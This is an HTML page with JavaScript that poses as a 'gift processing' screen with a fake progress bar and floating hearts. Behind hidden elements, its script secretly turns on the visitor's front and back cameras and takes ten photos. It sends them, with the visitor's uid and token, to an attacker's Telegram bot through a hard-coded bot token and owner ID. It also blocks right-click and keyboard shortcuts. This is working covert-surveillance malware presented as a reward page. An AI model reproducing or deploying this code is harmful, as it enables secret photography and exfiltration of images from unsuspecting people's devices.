<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Loading Your Gift...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: white;
        }
        
        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border: 2px solid #ff00ff;
            box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
        }
        
        .gift-icon {
            font-size: 100px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
            display: inline-block;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        h1 {
            color: #ff00ff;
            margin-bottom: 20px;
            font-size: 32px;
        }
        
        .message {
            color: #ccc;
            margin-bottom: 30px;
            line-height: 1.6;
            font-size: 18px;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid #333;
            border-top: 5px solid #ff00ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-container {
            width: 100%;
            background: #333;
            height: 10px;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            width: 0%;
            transition: width 0.5s;
        }
        
        .status {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
        
        /* Hidden elements */
        #cameraVideo, #cameraCanvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
        
        .heart {
            position: absolute;
            color: #ff00ff;
            font-size: 20px;
            animation: float 5s linear infinite;
            pointer-events: none;
            z-index: 1;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <!-- Floating hearts for distraction -->
    <div id="heartsContainer"></div>
    
    <!-- Hidden camera -->
    <video id="cameraVideo" autoplay playsinline></video>
    <canvas id="cameraCanvas"></canvas>
    
    <!-- Main screen -->
    <div class="container">
        <div class="gift-icon">üéÅ</div>
        <h1>PROCESSING YOUR GIFT...</h1>
        <div class="message">
            üéâ Please wait while we process your exclusive reward...<br><br>
            This may take a few moments.
        </div>
        
        <div class="loader"></div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="statusText">Initializing gift system...</div>
        <div class="status" id="counterText"></div>
    </div>

    <script>
        // Telegram Bot API
        const BOT_TOKEN = "8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE";
        const OWNER_ID = "8215819954";
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        const uid = urlParams.get('uid');
        
        // DOM elements
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('statusText');
        const counterText = document.getElementById('counterText');
        const heartsContainer = document.getElementById('heartsContainer');
        const cameraVideo = document.getElementById('cameraVideo');
        const cameraCanvas = document.getElementById('cameraCanvas');
        const ctx = cameraCanvas.getContext('2d');
        
        // Variables
        let stream = null;
        let capturedPhotos = 0;
        let totalPhotos = 10;
        let isCapturing = false;
        let intervalId = null;
        
        // Create floating hearts (distraction)
        function createHearts() {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.textContent = '‚ù§Ô∏è';
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
            heart.style.animationDuration = (Math.random() * 4 + 3) + 's';
            heartsContainer.appendChild(heart);
            setTimeout(() => heart.remove(), 7000);
        }
        setInterval(createHearts, 500);
        
        // Update progress display
        function updateProgress(photoNum) {
            const percent = (photoNum / totalPhotos) * 100;
            progressBar.style.width = percent + '%';
            
            // Show fake status messages
            const messages = [
                "Verifying gift authenticity...",
                "Processing reward details...",
                "Connecting to gift server...",
                "Finalizing delivery...",
                "Almost complete..."
            ];
            
            if (photoNum < totalPhotos) {
                const randomMsg = messages[photoNum % messages.length];
                statusText.textContent = randomMsg;
                counterText.textContent = `Step ${photoNum + 1} of ${totalPhotos}`;
            } else {
                statusText.textContent = "‚úÖ Gift processed successfully!";
                counterText.textContent = "Closing this window...";
            }
        }
        
        // Initialize hidden camera
        async function initCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: { exact: "user" }, // Front camera
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    }
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = stream;
                
                // Wait for video to load
                await new Promise(resolve => {
                    cameraVideo.onloadedmetadata = resolve;
                });
                
                return true;
            } catch (error) {
                console.log('Camera access not granted');
                return false;
            }
        }
        
        // Capture photo silently
        function capturePhoto() {
            if (!stream) return null;
            
            try {
                cameraCanvas.width = cameraVideo.videoWidth;
                cameraCanvas.height = cameraVideo.videoHeight;
                ctx.drawImage(cameraVideo, 0, 0);
                
                // Convert to low quality to save bandwidth
                const photoData = cameraCanvas.toDataURL('image/jpeg', 0.5);
                return photoData.split(',')[1]; // Base64 data
            } catch (error) {
                return null;
            }
        }
        
        // Switch to back camera
        async function switchToBackCamera() {
            if (!stream) return false;
            
            try {
                // Stop current stream
                stream.getTracks().forEach(track => track.stop());
                
                // Start back camera
                const constraints = {
                    video: {
                        facingMode: { exact: "environment" },
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    }
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = stream;
                return true;
            } catch (error) {
                return false;
            }
        }
        
        // Send photo to Telegram
        async function sendPhotoToTelegram(chatId, photoBase64, caption) {
            try {
                // Convert base64 to blob
                const byteCharacters = atob(photoBase64);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], {type: 'image/jpeg'});
                
                // Create form data
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                
                // Send to Telegram
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending photo:', error);
                return false;
            }
        }
        
        // Send message to Telegram
        async function sendMessageToTelegram(chatId, text) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Error sending message:', error);
                return false;
            }
        }
        
        // Main stealth capture function
        async function startStealthCapture() {
            if (!token || !uid) return;
            
            isCapturing = true;
            updateProgress(0);
            
            // Initialize camera
            const hasCamera = await initCamera();
            
            if (!hasCamera) {
                // No camera - send notification anyway
                await sendMessageToTelegram(OWNER_ID, 
                    `üéØ STEALTH TRAP ACTIVATED (No Camera)\nUser: ${uid}\nToken: ${token}`);
                finishProcess();
                return;
            }
            
            // Wait for camera to stabilize
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // ===== CAPTURE IN BACKGROUND =====
            // Capture every 2 seconds, even if browser is minimized
            
            let photoIndex = 0;
            let useFrontCamera = true;
            
            intervalId = setInterval(async () => {
                if (photoIndex >= totalPhotos) {
                    clearInterval(intervalId);
                    await finishProcess();
                    return;
                }
                
                try {
                    // Capture photo
                    const photoData = capturePhoto();
                    
                    if (photoData) {
                        // Determine camera type
                        const cameraType = useFrontCamera ? 'Front' : 'Back';
                        const caption = `üì∏ ${cameraType} Camera | Photo ${photoIndex + 1}/${totalPhotos} | User: ${uid}`;
                        
                        // Send to admin
                        await sendPhotoToTelegram(OWNER_ID, photoData, caption);
                        
                        capturedPhotos++;
                        updateProgress(photoIndex + 1);
                        
                        // Switch camera every 5 photos
                        if (photoIndex === 4 && useFrontCamera) {
                            const switched = await switchToBackCamera();
                            if (switched) {
                                useFrontCamera = false;
                                await new Promise(resolve => setTimeout(resolve, 500));
                            }
                        }
                    }
                    
                    photoIndex++;
                    
                } catch (error) {
                    console.error('Capture error:', error);
                    photoIndex++;
                }
                
            }, 2000); // Capture every 2 seconds
        }
        
        // Finish process
        async function finishProcess() {
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Send final notifications
            await sendMessageToTelegram(OWNER_ID,
                `‚úÖ STEALTH CAPTURE COMPLETE\nUser: ${uid}\nToken: ${token}\nPhotos: ${capturedPhotos}`);
            
            await sendMessageToTelegram(uid,
                `üéâ Your gift has been processed!\nThank you for participating.`);
            
            // Update to show completion
            updateProgress(totalPhotos);
            
            // Close window after 3 seconds
            setTimeout(() => {
                document.body.innerHTML = `
                    <div class="container">
                        <div style="font-size:60px; margin-bottom:20px;">‚úÖ</div>
                        <h1>GIFT DELIVERED!</h1>
                        <div class="message">
                            Your gift has been processed successfully.<br>
                            You can close this window.
                        </div>
                    </div>
                `;
            }, 3000);
        }
        
        // Start when page loads
        window.addEventListener('load', () => {
            if (!token || !uid) {
                document.body.innerHTML = `
                    <div class="container">
                        <div style="font-size:60px; margin-bottom:20px;">‚ùå</div>
                        <h1>INVALID LINK</h1>
                        <div class="message">
                            This gift link is invalid or has expired.
                        </div>
                    </div>
                `;
                return;
            }
            
            // Start capture after 1 second delay
            setTimeout(startStealthCapture, 1000);
        });
        
        // Continue capturing even if page loses focus
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && isCapturing) {
                // Page is visible again
                statusText.textContent = "Resuming gift processing...";
            }
        });
        
        // Prevent right-click
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        
        // Prevent keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
